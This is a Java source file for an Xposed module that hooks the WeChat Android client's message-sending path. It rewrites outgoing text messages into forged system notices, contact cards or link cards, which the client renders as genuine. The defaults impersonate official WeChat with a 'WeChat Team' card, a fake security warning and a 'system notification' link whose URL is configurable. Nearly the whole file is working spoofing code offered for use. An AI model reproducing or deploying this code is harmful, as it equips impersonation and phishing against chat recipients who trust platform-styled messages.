package com.leshao.v3.hook;

import android.content.SharedPreferences;

import com.leshao.v3.ChatFooterLongPressMenu;
import com.leshao.v3.ContextManager;
import com.leshao.v3.LogWriter;
import com.leshao.v3.wm.utils.WmReflect;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;

/**
 * 文档《WeChat_MsgForge_Analysis.md》——消息类型伪装。
 *
 * <p>原理：微信 message 表的 field_type(int) 决定气泡渲染，客户端不做类型↔内容一致性校验。
 * 出站文本消息（type==1）经 {@code v51.r0}（NetSceneSendMsg）构造时把 args[1]=content、
 * args[2]=type 改写为伪造类型与配套 XML，即被微信“原生”渲染成系统消息 / 名片 / 链接卡片。</p>
 *
 * <p>推荐方案 A：hook NetSceneSendMsg 构造器 before，改写参数。本实现仅处理出站 type==1 的纯文本。</p>
 */
public final class MsgForgeHook {

    public static final String TAG = "MsgForge";

    private static final String K_ENABLED = "ls_msgforge_enabled";
    private static final String K_MODE = "ls_msgforge_mode";
    private static final String K_TEXT = "ls_msgforge_text";
    private static final String K_CARD_WXID = "ls_msgforge_card_wxid";
    private static final String K_CARD_NICK = "ls_msgforge_card_nick";
    private static final String K_APP_TITLE = "ls_msgforge_app_title";
    private static final String K_APP_DESC = "ls_msgforge_app_desc";
    private static final String K_APP_URL = "ls_msgforge_app_url";

    public static final String MODE_SYSTEM = "system";
    public static final String MODE_CARD = "card";
    public static final String MODE_APPMSG = "appmsg";

    private static final String DEF_TEXT = "【安全提示】检测到当前会话存在风险，请谨慎操作。";
    private static final String DEF_CARD_WXID = "gh_000000000000";
    private static final String DEF_CARD_NICK = "微信团队";
    private static final String DEF_APP_TITLE = "系统通知";
    private static final String DEF_APP_DESC = "点击查看详情";
    private static final String DEF_APP_URL = "https://weixin.qq.com/";

    private static volatile boolean sEnabled = false;
    private static volatile String sMode = MODE_SYSTEM;
    private static volatile String sText = DEF_TEXT;
    private static volatile String sCardWxid = DEF_CARD_WXID;
    private static volatile String sCardNick = DEF_CARD_NICK;
    private static volatile String sAppTitle = DEF_APP_TITLE;
    private static volatile String sAppDesc = DEF_APP_DESC;
    private static volatile String sAppUrl = DEF_APP_URL;

    private MsgForgeHook() {}

    // ---------------- 配置 ----------------

    public static void updateConfig() {
        SharedPreferences sp;
        try {
            sp = ContextManager.getPrefs();
        } catch (Throwable t) {
            return;
        }
        if (sp == null) return;
        sEnabled = sp.getBoolean(K_ENABLED, false);
        sMode = sp.getString(K_MODE, MODE_SYSTEM);
        sText = sp.getString(K_TEXT, DEF_TEXT);
        sCardWxid = sp.getString(K_CARD_WXID, DEF_CARD_WXID);
        sCardNick = sp.getString(K_CARD_NICK, DEF_CARD_NICK);
        sAppTitle = sp.getString(K_APP_TITLE, DEF_APP_TITLE);
        sAppDesc = sp.getString(K_APP_DESC, DEF_APP_DESC);
        sAppUrl = sp.getString(K_APP_URL, DEF_APP_URL);
        LogWriter.log(TAG, "config enabled=" + sEnabled + " mode=" + sMode);
    }

    public static boolean isEnabled() {
        try {
            return ContextManager.getPrefs().getBoolean(K_ENABLED, false);
        } catch (Throwable t) {
            return sEnabled;
        }
    }

    public static void setEnabled(boolean on) {
        try {
            ContextManager.getPrefs().edit().putBoolean(K_ENABLED, on).apply();
        } catch (Throwable ignored) {}
        sEnabled = on;
        LogWriter.log(TAG, "setEnabled " + on);
    }

    public static String getMode() {
        try {
            return ContextManager.getPrefs().getString(K_MODE, MODE_SYSTEM);
        } catch (Throwable t) {
            return sMode;
        }
    }

    public static void setMode(String mode) {
        if (mode == null) mode = MODE_SYSTEM;
        try {
            ContextManager.getPrefs().edit().putString(K_MODE, mode).apply();
        } catch (Throwable ignored) {}
        sMode = mode;
    }

    public static String getText() {
        try {
            return ContextManager.getPrefs().getString(K_TEXT, DEF_TEXT);
        } catch (Throwable t) {
            return sText;
        }
    }

    public static void setText(String v) { put(K_TEXT, v); sText = v; }

    public static String getCardWxid() { return getStr(K_CARD_WXID, DEF_CARD_WXID, sCardWxid); }
    public static void setCardWxid(String v) { put(K_CARD_WXID, v); sCardWxid = v; }

    public static String getCardNick() { return getStr(K_CARD_NICK, DEF_CARD_NICK, sCardNick); }
    public static void setCardNick(String v) { put(K_CARD_NICK, v); sCardNick = v; }

    public static String getAppTitle() { return getStr(K_APP_TITLE, DEF_APP_TITLE, sAppTitle); }
    public static void setAppTitle(String v) { put(K_APP_TITLE, v); sAppTitle = v; }

    public static String getAppDesc() { return getStr(K_APP_DESC, DEF_APP_DESC, sAppDesc); }
    public static void setAppDesc(String v) { put(K_APP_DESC, v); sAppDesc = v; }

    public static String getAppUrl() { return getStr(K_APP_URL, DEF_APP_URL, sAppUrl); }
    public static void setAppUrl(String v) { put(K_APP_URL, v); sAppUrl = v; }

    private static String getStr(String key, String def, String cache) {
        try {
            return ContextManager.getPrefs().getString(key, def);
        } catch (Throwable t) {
            return cache != null ? cache : def;
        }
    }

    private static void put(String key, String v) {
        try {
            ContextManager.getPrefs().edit().putString(key, v).apply();
        } catch (Throwable ignored) {}
    }

    // ---------------- Hook ----------------

    public static void hook(final ClassLoader cl) {
        updateConfig();
        DexKitHelper.addPostScanCallback(() -> install(cl));
    }

    private static void install(ClassLoader cl) {
        // 主生效点：出站 UI 文本链路（om.SendTextComponent → oh0.c.a(toUser,content,type)）。
        // v3.0.57 实测仅 hook v51.r0 构造器/doScene 在本机从未触发，故改为在真实发送链路上改写。
        installIntercept(cl);
        try {
            // 用「方法体内直接引用 CGI 路径」精确定位 NetSceneSendMsg，返回 sig 形如
            // "v51.r0.doScene(...)"，其声明类才是真正构造出站消息的类。
            // 旧的 findClassesByString 会因字段类型/字符串引用命中外层无关类（实测挂到
            // com.tencent.mm.plugin.voip.model.y），必须取方法声明类。
            List<String> cands = new java.util.ArrayList<>();
            try {
                List<String> sigs = DexKitHelper.findMethodsByString(
                        cl, null, "/cgi-bin/micromsg-bin/newsendmsg");
                for (String sig : sigs) {
                    String cn = classNameOf(sig);
                    if (cn != null && !cands.contains(cn)) cands.add(cn);
                }
            } catch (Throwable ignored) {}
            if (cands.isEmpty()) {
                cands = HookUtil.classCandidates(cl,
                        "/cgi-bin/micromsg-bin/newsendmsg", "MicroMsg.NetSceneSendMsg");
            }
            if (cands.isEmpty()) {
                LogWriter.log(TAG, "NetSceneSendMsg 未定位，伪装功能不可用");
                return;
            }
            LogWriter.log(TAG, "NetSceneSendMsg candidates=" + cands);
            for (String clsName : cands) {
                int total = 0;
                for (Class<?> c : HookUtil.loadClasses(cl, clsName)) {
                    total += HookUtil.hookCtors(c, MsgForgeHook::isSendCtor, new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) {
                            try {
                                disguiseCtor(param);
                            } catch (Throwable e) {
                                LogWriter.log(TAG, "before err: " + e);
                            }
                        }
                    });
                    if (total > 0) hookDoScenePatch(c);
                }
                if (total > 0) {
                    LogWriter.log(TAG, "hooked ctors=" + total + " cls=" + clsName);
                    return;
                }
                LogWriter.log(TAG, "候选 " + clsName + " 无匹配构造器，尝试下一个");
            }
            LogWriter.log(TAG, "NetSceneSendMsg 构造器未匹配 candidates=" + cands);
        } catch (Throwable e) {
            LogWriter.log(TAG, "hook err: " + e);
        }
    }

    /**
     * 匹配文档 §5.2/§9.1 的两个构造器重载：(String toUser, String content, int type,
     * int flag, long|Object, String msgSource)。8.0.78 实机出站路径走 Object 重载，
     * 旧实现只挂 long 重载导致从不触发。
     */
    private static boolean isSendCtor(Class<?>[] params) {
        return params != null && params.length == 6
                && params[0] == String.class
                && params[1] == String.class
                && HookUtil.isInt(params[2])
                && HookUtil.isInt(params[3])
                && params[5] == String.class;
    }

    private static void disguiseCtor(XC_MethodHook.MethodHookParam param) {
        if (!sEnabled) return;
        Object[] args = param.args;
        if (args == null || args.length != 6) return;
        int type = args[2] instanceof Number ? ((Number) args[2]).intValue() : 0;
        if (type != 1) return;
        String content = apply(args[1] instanceof String ? (String) args[1] : "");
        if (content == null) return;
        args[1] = content;
        args[2] = targetType();
        args[3] = targetFlag();
        LogWriter.log(TAG, "disguise ctor -> type=" + args[2]);
    }

    /** 方案B 兜底：即使构造器未命中，也在 doScene 出网前改写请求体 (doc §9.2)。 */
    private static void hookDoScenePatch(Class<?> c) {
        for (Class<?> cur = c; cur != null && cur != Object.class; cur = cur.getSuperclass()) {
            for (Method m : cur.getDeclaredMethods()) {
                if (!"doScene".equals(m.getName()) || m.getParameterTypes().length != 2) continue;
                try {
                    m.setAccessible(true);
                    XposedBridge.hookMethod(m, new XC_MethodHook() {
                        @Override
                        protected void afterHookedMethod(MethodHookParam param) {
                            try {
                                if (sEnabled) patchNetwork(param.thisObject);
                            } catch (Throwable ignored) {}
                        }
                    });
                    LogWriter.log(TAG, "hooked doScene patch cls=" + cur.getName());
                } catch (Throwable ignored) {}
                return;
            }
        }
    }

    private static void patchNetwork(Object scene) {
        if (scene == null) return;
        Object listObj = findRequestList(scene);
        if (!(listObj instanceof List)) return;
        String content = apply("");
        int type = targetType();
        int patched = 0;
        for (Object item : (List<?>) listObj) {
            if (item == null) continue;
            if (setFieldByName(item, "e", content) && setFieldByName(item, "f", type)) patched++;
        }
        if (patched > 0) LogWriter.log(TAG, "network patch items=" + patched + " type=" + type);
    }

    /** 在 NetScene 对象图里定位出站请求的 item 列表（元素含 String + int 字段）。 */
    private static Object findRequestList(Object root) {
        java.util.ArrayDeque<Object> q = new java.util.ArrayDeque<>();
        java.util.Set<Object> seen =
                java.util.Collections.newSetFromMap(new java.util.IdentityHashMap<>());
        q.add(root);
        int visited = 0;
        while (!q.isEmpty() && visited < 60) {
            Object o = q.poll();
            if (o == null || seen.contains(o)) continue;
            seen.add(o);
            visited++;
            Class<?> c = o.getClass();
            if (c.isArray() || c.getName().startsWith("java.")) continue;
            for (Class<?> k = c; k != null && k != Object.class; k = k.getSuperclass()) {
                for (Field f : k.getDeclaredFields()) {
                    Object v;
                    try {
                        f.setAccessible(true);
                        v = f.get(o);
                    } catch (Throwable t) {
                        continue;
                    }
                    if (v instanceof List) {
                        List<?> l = (List<?>) v;
                        if (!l.isEmpty() && isMsgItem(l.get(0))) return v;
                    } else if (v != null && !(v instanceof String) && !(v instanceof Number)
                            && !(v instanceof Boolean)) {
                        q.add(v);
                    }
                }
            }
        }
        return null;
    }

    /** 出站请求 item（doc §5.4 pr4：e=Content(String)、f=Type(int)）。 */
    private static boolean isMsgItem(Object o) {
        return o != null && hasField(o, "e", String.class) && hasField(o, "f", int.class);
    }

    private static boolean hasField(Object o, String name, Class<?> type) {
        for (Class<?> k = o.getClass(); k != null && k != Object.class; k = k.getSuperclass()) {
            try {
                if (k.getDeclaredField(name).getType() == type) return true;
            } catch (NoSuchFieldException ignored) {
            } catch (Throwable ignored) {
                return false;
            }
        }
        return false;
    }

    private static boolean setFieldByName(Object o, String name, Object val) {
        for (Class<?> k = o.getClass(); k != null && k != Object.class; k = k.getSuperclass()) {
            try {
                Field f = k.getDeclaredField(name);
                f.setAccessible(true);
                if (val instanceof String) {
                    if (f.getType() != String.class) return false;
                } else if (val instanceof Integer) {
                    if (f.getType() != int.class && f.getType() != Integer.class) return false;
                }
                f.set(o, val);
                return true;
            } catch (NoSuchFieldException ignored) {
            } catch (Throwable t) {
                return false;
            }
        }
        return false;
    }

    // ---------------- 伪装内容 ----------------

    private static int targetType() {
        switch (sMode) {
            case MODE_CARD: return 42;
            case MODE_APPMSG: return 49;
            default: return 10000;
        }
    }

    private static int targetFlag() {
        return MODE_CARD.equals(sMode) ? 1 : 0;
    }

    /** 生成伪造 payload，doc §3.4/3.5/3.6 模板。 */
    public static String apply(String original) {
        switch (sMode) {
            case MODE_CARD: return cardXml();
            case MODE_APPMSG: return appMsgXml();
            default: return systemContent(original);
        }
    }

    public static String systemContent(String original) {
        return (sText == null || sText.isEmpty()) ? original : sText;
    }

    public static String cardXml() {
        String wxid = xml(sCardWxid);
        String nick = xml(sCardNick);
        return "<msg username=\"" + wxid + "\" nickname=\"" + nick
                + "\" fullpy=\"\" shortpy=\"\" alias=\"\" imagestatus=\"-1\""
                + " scene=\"17\" province=\"\" city=\"\" sign=\"\" sex=\"0\""
                + " certflag=\"0\" certinfo=\"\" brandIconUrl=\"\" brandHomeUrl=\"\""
                + " brandSubscriptConfigUrl=\"\" brandFlags=\"0\" regionCode=\"CN\">"
                + "<card type=\"0\"/></msg>";
    }

    public static String appMsgXml() {
        return "<msg>"
                + "<appmsg appid=\"\" sdkver=\"0\">"
                + "<title>" + xml(sAppTitle) + "</title>"
                + "<des>" + xml(sAppDesc) + "</des>"
                + "<action>view</action>"
                + "<type>5</type>"
                + "<url>" + xml(sAppUrl) + "</url>"
                + "</appmsg>"
                + "<fromusername></fromusername>"
                + "<scene>0</scene>"
                + "<appinfo><version>1</version><appname></appname></appinfo>"
                + "</msg>";
    }

    private static String xml(String v) {
        if (v == null) return "";
        return v.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;");
    }

    /** 供 UI 预览当前伪装配置的 payload。 */
    public static String preview() {
        updateConfig();
        switch (sMode) {
            case MODE_CARD: return cardXml();
            case MODE_APPMSG: return appMsgXml();
            default: return systemContent(DEF_TEXT);
        }
    }

    /** 从 "pkg.Cls.method(params)" 解析出声明类全名。 */
    private static String classNameOf(String sig) {
        if (sig == null) return null;
        int p = sig.indexOf('(');
        if (p < 0) p = sig.length();
        String head = sig.substring(0, p);
        int dot = head.lastIndexOf('.');
        return dot > 0 ? head.substring(0, dot) : null;
    }

    /** 兼容旧入口：文档要求 hook 前确保构造器签名匹配，这里做一次签名自检用于日志。 */
    public static void dumpCtors(ClassLoader cl, String clsName) {
        try {
            for (Class<?> c : HookUtil.loadClasses(cl, clsName)) {
                for (Constructor<?> ctor : c.getDeclaredConstructors()) {
                    StringBuilder sb = new StringBuilder();
                    for (Class<?> p : ctor.getParameterTypes()) sb.append(p.getSimpleName()).append(',');
                    LogWriter.log(TAG, "ctor " + c.getName() + " (" + sb + ")");
                }
            }
        } catch (Throwable ignored) {}
    }

    // ---------------- UI 发送链路拦截（8.0.78 消息伪装真正生效点） ----------------
    //
    // 文档 §3.1：UI 文本链路 ChatFooter.d → … → om.SendTextComponent.w0 → pm.run
    //          → 新框架 oh0.c.a(toUser,content,type,...) 或 PPC v51.s1。
    // 实测 NetSceneSendMsg(v51.r0) 构造器在 8.0.78 出站路径不触发，因此改在
    // oh0.c（日志 MicroMsg.SendTextLogic）就地改写 content/type；若该类未定位，
    // 退回在 om.SendTextComponent 的文本入口「拦截原发送 + 经官方通道按伪造 type 重发」。

    private static void installIntercept(ClassLoader cl) {
        final ClassLoader fcl = resolveLoader(cl);
        // 两条链路同时安装，互不干扰：
        //  - oh0.c 命中时在发送任务内就地改写 content/type（对走新框架的发送生效）；
        //  - om.SendTextComponent 命中时「先重发后拦截」，覆盖 PPC(v51.s1) 等不经过
        //    oh0.c 的路径，并在 talker 已知时优先接管。
        // 二者只有其一会在单次发送中生效：om 拦截成功会跳过原发送（不再进入 oh0.c），
        // talker 未知放行时原发送才流经 oh0.c。因此不会重复伪装/重复发送。
        installLogicPatch(fcl);
        installSendComponentFallback(fcl);
    }

    private static ClassLoader resolveLoader(ClassLoader cl) {
        try {
            ClassLoader tk = VersionCompat.findTinkerClassLoader(cl);
            if (tk != null && !tk.getClass().getName().contains("Leshao") && tk != cl) return tk;
        } catch (Throwable ignored) {}
        return cl;
    }

    /** 主方案：oh0.c（SendTextTask, MicroMsg.SendTextLogic）的 (String,String,int,..) 发送方法改写。 */
    private static boolean installLogicPatch(ClassLoader cl) {
        try {
            List<String> names = new java.util.ArrayList<>();
            try {
                names.addAll(DexKitHelper.findClassesByString(cl, "MicroMsg.SendTextLogic"));
            } catch (Throwable ignored) {}
            if (!names.contains("oh0.c")) names.add("oh0.c");
            // 8.0.78 新框架任务类名可能变化，额外用文档 §5.1 的 om→SendTextTask 关联串兜底。
            try {
                for (String cn : DexKitHelper.findClassesByString(cl, "oh0.c.a")) {
                    if (!names.contains(cn)) names.add(cn);
                }
            } catch (Throwable ignored) {}
            int installed = 0;
            for (String cn : names) {
                Class<?> c;
                try {
                    c = XposedHelpers.findClass(cn, cl);
                } catch (Throwable t) {
                    continue;
                }
                for (Method m : c.getDeclaredMethods()) {
                    Class<?>[] pts = m.getParameterTypes();
                    if (pts.length < 3 || pts[0] != String.class || pts[1] != String.class) continue;
                    if (!HookUtil.isInt(pts[2])) continue;
                    try {
                        m.setAccessible(true);
                        XposedBridge.hookMethod(m, new XC_MethodHook() {
                            @Override
                            protected void beforeHookedMethod(MethodHookParam p) {
                                try {
                                    patchLogicArgs(p);
                                } catch (Throwable e) {
                                    LogWriter.log(TAG, "logic patch err: " + e);
                                }
                            }
                        });
                        installed++;
                    } catch (Throwable ignored) {}
                }
            }
            LogWriter.log(TAG, "SendTextLogic 链路补丁 hooks=" + installed + " cands=" + names.size());
            return installed > 0;
        } catch (Throwable t) {
            LogWriter.log(TAG, "SendTextLogic 链路补丁 FAIL: " + t.getMessage());
            return false;
        }
    }

    private static void patchLogicArgs(XC_MethodHook.MethodHookParam p) {
        if (!sEnabled) return;
        Object[] a = p.args;
        if (a == null || a.length < 3 || !(a[1] instanceof String)) return;
        int type = a[2] instanceof Number ? ((Number) a[2]).intValue() : 0;
        if (type != 1) return;
        String original = (String) a[1];
        if (isForged(original)) return;
        String content = apply(original);
        if (content == null) return;
        a[1] = content;
        a[2] = targetType();
        if (a.length >= 4 && a[3] instanceof Number) a[3] = targetFlag();
        LogWriter.log(TAG, "logic patch -> type=" + a[2]
                + " origLen=" + (original == null ? 0 : original.length()));
    }

    /** 兜底：om.SendTextComponent 文本入口，拦截原发送并按伪造 type 经官方通道重发。 */
    private static void installSendComponentFallback(ClassLoader cl) {
        try {
            List<String> names = new java.util.ArrayList<>();
            try {
                names.addAll(DexKitHelper.findClassesByString(
                        cl, "MicroMsg.ChattingUI.SendTextComponent"));
            } catch (Throwable ignored) {}
            if (!names.contains("com.tencent.mm.ui.chatting.component.om")) {
                names.add("com.tencent.mm.ui.chatting.component.om");
            }
            // 主类名在 R8 重排后可能变化，用 DexKit 找 om.SendTextTask 串所在类兜底。
            try {
                List<String> taskCands = DexKitHelper.findClassesByString(
                        cl, "om.SendTextTask");
                for (String cn : taskCands) if (!names.contains(cn)) names.add(cn);
            } catch (Throwable ignored) {}
            int installed = 0;
            for (String cn : names) {
                Class<?> c;
                try {
                    c = XposedHelpers.findClass(cn, cl);
                } catch (Throwable t) {
                    continue;
                }
                for (Method m : c.getDeclaredMethods()) {
                    Class<?>[] pts = m.getParameterTypes();
                    if (pts.length < 1 || pts[0] != String.class) continue;
                    boolean mapTail = false;
                    for (int i = 1; i < pts.length; i++) {
                        if (Map.class.isAssignableFrom(pts[i])) { mapTail = true; break; }
                    }
                    String nm = m.getName();
                    // 8.0.78 实测入口：w0(String,String,String,boolean)（content,atUser,tempUser,…）。
                    if (!mapTail && !"A0".equals(nm) && !"w0".equals(nm)
                            && !"y0".equals(nm) && !"B0".equals(nm)) continue;
                    try {
                        m.setAccessible(true);
                        XposedBridge.hookMethod(m, new XC_MethodHook() {
                            @Override
                            protected void beforeHookedMethod(MethodHookParam p) {
                                try {
                                    interceptAndResend(p, cl, p.method.getName());
                                } catch (Throwable e) {
                                    LogWriter.log(TAG, "ui intercept err(" + p.method.getName() + "): " + e);
                                }
                            }
                        });
                        installed++;
                    } catch (Throwable ignored) {}
                }
            }
            LogWriter.log(TAG, "SendTextComponent 兜底拦截 hooks=" + installed + " cands=" + names.size());
        } catch (Throwable t) {
            LogWriter.log(TAG, "SendTextComponent 兜底拦截 FAIL: " + t.getMessage());
        }
    }

    private static void interceptAndResend(XC_MethodHook.MethodHookParam p, ClassLoader cl, String mname) {
        if (!sEnabled) return;
        Object[] a = p.args;
        if (a == null || a.length < 1 || !(a[0] instanceof String)) return;
        String original = (String) a[0];
        if (original == null || original.isEmpty() || isForged(original)) {
            LogWriter.log(TAG, "ui intercept " + mname + " skip empty/forged len="
                    + (original == null ? -1 : original.length()));
            return;
        }
        // 8.0.78 实测 w0(content, atUser, tempUser, ...)，tempUser 才是会话方；
        // 部分方法把 content 放首参以外的位置时由 om 的调用约定决定，这里按 content/会话方 双解析。
        String talker = null;
        try {
            talker = ChatFooterLongPressMenu.currentTalker();
        } catch (Throwable ignored) {}
        if ((talker == null || talker.isEmpty()) && a.length >= 3) {
            for (int i = 1; i < a.length; i++) {
                if (a[i] instanceof String && !((String) a[i]).isEmpty()
                        && ((String) a[i]).length() < 128) {
                    talker = (String) a[i];
                    break;
                }
            }
        }
        if ((talker == null || talker.isEmpty()) && p.thisObject != null) {
            try {
                talker = ChatFooterLongPressMenu.resolveTalkerFrom(p.thisObject);
            } catch (Throwable ignored) {}
        }
        if (talker == null || talker.isEmpty()) {
            LogWriter.log(TAG, "ui intercept " + mname + " talker 未知, 放行原发送 text=" + trunc(original, 20));
            return;
        }
        String content = apply(original);
        if (content == null) return;
        int type = targetType();
        // 先经官方通道按伪造 type 发送，成功后再拦截原发送；重发失败则放行原发送，
        // 避免「伪造发送失败 + 原发送被拦截」导致用户消息丢失。
        boolean ok = WmReflect.sendTextMsg(cl, content, talker, type, targetFlag());
        if (!ok) {
            LogWriter.log(TAG, "ui intercept " + mname + ": 伪造重发失败, 放行原发送 talker=" + talker);
            return;
        }
        try {
            p.setResult(defaultReturnValue(methodReturnType(p)));
        } catch (Throwable ignored) {}
        LogWriter.log(TAG, "ui intercept " + mname + " resend type=" + type + " ok=true"
                + " talker=" + talker + " text=" + trunc(original, 30));
    }

    private static boolean isForged(String s) {
        if (s == null) return false;
        String t = s.trim();
        return t.startsWith("<msg") || t.startsWith("<?xml") || t.contains("<appmsg");
    }

    private static String trunc(String s, int m) {
        return s == null ? "" : s.length() > m ? s.substring(0, m) + "..." : s;
    }

    private static Object defaultReturnValue(Class<?> rt) {
        if (rt == null || rt == void.class || rt == Void.class) return null;
        if (rt == boolean.class) return false;
        if (rt == int.class) return 0;
        if (rt == long.class) return 0L;
        if (rt == float.class) return 0f;
        if (rt == double.class) return 0d;
        if (rt == short.class) return (short) 0;
        if (rt == byte.class) return (byte) 0;
        if (rt == char.class) return '\0';
        return null;
    }

    private static Class<?> methodReturnType(XC_MethodHook.MethodHookParam param) {
        try {
            if (param.method instanceof java.lang.reflect.Method) {
                return ((java.lang.reflect.Method) param.method).getReturnType();
            }
        } catch (Throwable ignored) {}
        return null;
    }
}
